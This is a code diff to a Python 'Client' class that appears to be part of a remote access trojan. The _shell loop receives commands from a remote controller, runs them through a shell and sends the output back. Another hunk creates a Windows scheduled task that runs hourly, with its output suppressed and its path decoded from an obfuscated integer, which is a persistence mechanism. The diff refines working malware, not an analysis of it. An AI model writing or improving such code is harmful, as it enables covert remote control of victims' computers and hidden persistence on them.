@@ -546,21 +546,23 @@ class Client(object):
 
     def _shell(self):
         while True:
-            if self._mode:
+            if self.shell.status:
                 break
-            prompt = "[%d @ {}]> ".format(os.getcwd())
-            self._send(prompt, method='prompt')   
-            data = self._receive()
-            if not data:
-                continue
-            cmd, _, action = bytes(data).partition(' ')
-            if cmd in self._commands:
-                result = self._commands[cmd](action) if len(action) else self._commands[cmd]()
             else:
-                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-            if result and len(result):
-                result = '\n' + str(result) + '\n'
-                self._send(result, method=cmd)
+                prompt = "[%d @ {}]> ".format(os.getcwd())
+                self._send(prompt, method='prompt')   
+                data = self._receive()
+                if not data:
+                    continue
+                cmd, _, action = bytes(data).partition(' ')
+                if cmd in self._commands:
+                    result = self._commands[cmd](action) if len(action) else self._commands[cmd]()
+                else:
+                    result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                if result and len(result):
+                    result = '\n' + str(result) + '\n'
+                    self._send(result, method=cmd)
+        return self.standby()
 
     def _standby(self):
         while True:
@@ -819,7 +821,7 @@ class Client(object):
             task_run    = long_to_bytes(long(self.__f__))
             task_name   = os.path.splitext(os.path.basename(task_run))[0]
             try:
-                if subprocess.call('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), shell=True) == 0:
+                if subprocess.call('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                     return True
             except Exception as e:
                 if self.__v__:
